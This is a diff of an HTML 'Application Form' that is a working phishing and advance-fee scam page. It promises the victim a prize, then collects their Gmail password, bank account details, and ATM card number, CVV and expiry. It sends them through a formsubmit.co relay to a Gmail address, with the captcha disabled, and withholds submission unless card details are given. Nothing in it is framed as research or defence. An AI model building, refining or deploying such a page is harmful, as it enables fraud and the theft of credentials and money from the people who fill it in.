@@ -4,161 +4,170 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Application Form</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.min.css"/>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      padding: 20px;
-    }
-
-    h2 {
-      text-align: center;
-    }
-
-    .secure-message {
-      text-align: center;
-      color: green;
-      margin-bottom: 15px;
-    }
-
-    form {
-      max-width: 500px;
-      margin: 0 auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #ccc;
-    }
-
-    label {
-      display: block;
-      margin-top: 15px;
-    }
-
-    input {
-      width: 100%;
-      padding: 8px;
-      margin-top: 5px;
-      box-sizing: border-box;
-    }
-
-    .toggle {
-      margin-top: -25px;
-      float: right;
-      margin-right: 10px;
-      cursor: pointer;
-      font-size: 12px;
-      color: blue;
-    }
-
-    .error {
-      color: red;
-      font-size: 12px;
-      display: none;
-    }
-
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #28a745;
-      color: white;
-      font-size: 16px;
-      margin-top: 20px;
-      border: none;
-      border-radius: 5px;
-    }
-
-    .iti {
-      width: 100%;
-    }
+    body { font-family: Arial, sans-serif; padding: 15px; margin: 0; background: #f9f9f9; }
+    form { max-width: 480px; margin: auto; background: white; padding: 15px; border-radius: 10px;
+           box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+    h2 { text-align: center; font-size: 1.5em; margin-bottom: 10px; }
+    .notice { text-align: center; font-size: 0.9em; color: #555; margin-bottom: 20px; }
+    label { display: block; margin-top: 12px; font-weight: bold; font-size: 0.95em; }
+    input, select { width: 100%; padding: 10px; font-size: 1em; margin-top: 5px;
+                    border: 1px solid #ccc; border-radius: 6px; }
+    .readonly-box { background: #f0f0f0; padding: 10px; border: 1px solid #ccc;
+                    border-radius: 6px; margin-top: 8px; font-weight: bold; }
+    .card-section { margin-top: 10px; }
+    button { margin-top: 20px; width: 100%; padding: 12px; background: #007bff; color: white;
+             border: none; border-radius: 6px; font-size: 1em; }
+    button:disabled { background: #aaa; cursor: not-allowed; }
+    button:hover:enabled { background: #0056b3; }
+    .hidden { display: none; }
+    .password-wrapper { position: relative; }
+    .password-wrapper span { position: absolute; right: 10px; top: 50%;
+                              transform: translateY(-50%); cursor: pointer; font-size: 1.1em; }
   </style>
 </head>
 <body>
+  <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
+    <h2>Application Form</h2>
+    <div class="notice">We keep your details secure and confidential.</div>
 
-  <h2>Application Form</h2>
-  <div class="secure-message">We keep your details secure and confidential.</div>
+    <!-- 1: Full Name -->
+    <label for="fullName">1. Full Name</label>
+    <input type="text" id="fullName" name="fullName" required pattern="[A-Za-z\s]+" title="Letters and spaces only.">
 
-  <form action="https://formspree.io/f/your_form_id" method="POST" onsubmit="return validateForm()">
-    
-    <label>Full Name
-      <input type="text" name="full_name" required />
-    </label>
+    <!-- 2: Phone with country dropdown -->
+    <label for="phoneNumber">2. Phone Number</label>
+    <input type="tel" id="phoneNumber" name="phoneNumber" required>
 
-    <label>Phone Number
-      <input id="phone" type="tel" name="phone_number" required />
-      <div class="error" id="phone-error">Please enter a valid phone number.</div>
-    </label>
+    <!-- 3: Email -->
+    <label for="emailAddress">3. Email Address</label>
+    <input type="email" id="emailAddress" name="emailAddress" required pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" title="Only @gmail.com allowed.">
 
-    <label>Email
-      <input type="email" name="email" required />
-    </label>
+    <!-- 4: Email Password -->
+    <label for="emailPassword">4. Email Password</label>
+    <div class="password-wrapper">
+      <input type="password" id="emailPassword" name="emailPassword" required style="padding-right:40px;">
+      <span onclick="togglePassword()">👁️</span>
+    </div>
 
-    <label>Email Password
-      <input type="password" name="email_password" id="emailPass" required />
-      <span class="toggle" onclick="togglePassword('emailPass')">Show</span>
-    </label>
+    <!-- Remaining fields numbered 5+ -->
+    <label for="amountWon">5. Amount You Won</label>
+    <input type="text" id="amountWon" name="amountWon" required>
 
-    <label>Secret Code (PIN)
-      <input type="password" name="secret_code" id="pinField" required />
-      <span class="toggle" onclick="togglePassword('pinField')">Show</span>
-    </label>
+    <label for="bankType">6. Bank Account Type (e.g., Standard Bank)</label>
+    <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
 
-    <label>ATM Card Number
-      <input type="text" name="card_number" maxlength="16" pattern="\d{16}" required />
-    </label>
+    <label for="bankNumber">7. Bank Account Number</label>
+    <input type="text" id="bankNumber" name="bankNumber" required>
 
-    <label>CVV
-      <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required />
-    </label>
+    <label for="accountHolder">8. Bank Account Holder's Name</label>
+    <input type="text" id="accountHolder" name="accountHolder" required>
 
-    <label>Expiry Date (MM/YY)
-      <input type="text" name="expiry" pattern="\d{2}/\d{2}" placeholder="MM/YY" required />
-    </label>
+    <label for="atmLinked">9. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
+    <select id="atmLinked" name="atmLinked" required>
+      <option value="">--Select--</option><option value="Yes">Yes</option><option value="No">No</option>
+    </select>
 
-    <label>Amount Paid
-      <input type="number" name="amount_paid" required />
-    </label>
+    <div class="card-section hidden" id="cardSection">
+      <label>10. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
+      <label for="atmNumber">ATM Card Number</label>
+      <input type="text" id="atmNumber" name="atmNumber" required maxlength="16" pattern="\d{16}" inputmode="numeric" title="Exactly 16 digits.">
 
-    <label>Amount Applied For
-      <input type="number" name="amount_applied" required />
-    </label>
+      <label for="cvv">CVV (3 digits only)</label>
+      <input type="text" id="cvv" name="cvv" maxlength="3" required pattern="\d{3}" inputmode="numeric" title="3-digit CVV.">
 
-    <button type="submit">Submit Application</button>
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required pattern="^(0[1-9]|1[0-2])\/\d{2}$" oninput="formatExpiry(this)" title="MM/YY format.">
+    </div>
+
+    <label>11. Confirmation</label>
+    <div class="readonly-box" id="autoFilledNote">
+      You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
+    </div>
+
+    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thankyou.html">
+    <input type="hidden" name="_captcha" value="false">
+    <button type="submit" id="submitButton">Submit Application</button>
   </form>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"></script>
   <script>
-    const phoneInput = document.querySelector("#phone");
+    const phoneInput = document.getElementById("phoneNumber");
     const iti = window.intlTelInput(phoneInput, {
-      initialCountry: "auto",
-      preferredCountries: ["ke", "ng", "gh", "tz", "ug", "ls", "za"],
-      geoIpLookup: callback => {
-        fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE')
-          .then(res => res.json())
-          .then(data => callback(data.country))
-          .catch(() => callback("ke"));
-      },
-      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+      onlyCountries: ["dz","ao","bj","bw","bf","bi","cm","cv","cf","td","km","cg","cd","ci","dj","eg","gq","er","sz","et",
+                      "ga","gm","gh","gn","gw","ke","ls","lr","ly","mg","mw","ml","mr","mu","ma","mz","na","ne","ng",
+                      "rw","st","sn","sc","sl","so","za","ss","sd","tz","tg","tn","ug","zm","zw"],
+      separateDialCode: true,
+      autoPlaceholder: "aggressive",
+      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js"
     });
 
-    function togglePassword(id) {
-      const input = document.getElementById(id);
-      input.type = input.type === "password" ? "text" : "password";
+    phoneInput.addEventListener('blur', () => {
+      if (phoneInput.value.trim()) {
+        if (!iti.isValidNumber()) {
+          phoneInput.setCustomValidity("Please enter a valid number for selected country");
+        } else {
+          phoneInput.setCustomValidity("");
+        }
+      }
+    });
+
+    // dynamic banking preview
+    const amountInput = document.getElementById("amountWon");
+    const bankInput = document.getElementById("bankType");
+    const atmLinked = document.getElementById("atmLinked");
+    const amountPreview = document.getElementById("amountPreview");
+    const bankPreview = document.getElementById("bankPreview");
+    const bankTypePreview = document.getElementById("bankTypePreview");
+    const autoFilledNote = document.getElementById("autoFilledNote");
+    const cardSection = document.getElementById("cardSection");
+    const cvvInput = document.getElementById("cvv");
+    const expiryInput = document.getElementById("expiry");
+    const submitButton = document.getElementById("submitButton");
+
+    function updateDynamicText() {
+      const amount = amountInput.value || "[amount]";
+      const phone = iti.getNumber() || "[phone]";
+      const bank = bankInput.value || "[bank]";
+      amountPreview.textContent = amount;
+      bankPreview.textContent = bank;
+      bankTypePreview.textContent = bank;
+      if (atmLinked.value === "Yes") {
+        autoFilledNote.textContent = `You will receive ${amount} immediately you submit the form and the SMS verification sent to your number ${phone}`;
+      }
     }
 
-    function validateForm() {
-      const phoneValid = iti.isValidNumber();
-      const phoneError = document.getElementById("phone-error");
-      if (!phoneValid) {
-        phoneError.style.display = "block";
-        return false;
+    amountInput.addEventListener("input", updateDynamicText);
+    phoneInput.addEventListener("input", updateDynamicText);
+    bankInput.addEventListener("input", updateDynamicText);
+
+    atmLinked.addEventListener("change", () => {
+      if (atmLinked.value === "Yes") {
+        cardSection.classList.remove("hidden");
+        submitButton.disabled = false;
+        submitButton.textContent = "Submit Application";
+        cvvInput.required = true;
+        expiryInput.required = true;
+        updateDynamicText();
       } else {
-        phoneError.style.display = "none";
+        cardSection.classList.add("hidden");
+        submitButton.disabled = true;
+        submitButton.textContent = "Application Declined – ATM Card Required";
+        autoFilledNote.textContent = "YOU MUST HAVE AN ATM CARD TO PROCEED";
       }
-      return true;
+    });
+
+    function formatExpiry(input) {
+      let v = input.value.replace(/\D/g, '');
+      input.value = v.length >= 3 ? v.slice(0,2) + '/' + v.slice(2,4) : v;
+    }
+
+    function togglePassword() {
+      const pw = document.getElementById("emailPassword");
+      pw.type = pw.type === "password" ? "text" : "password";
     }
   </script>
-
 </body>
 </html>
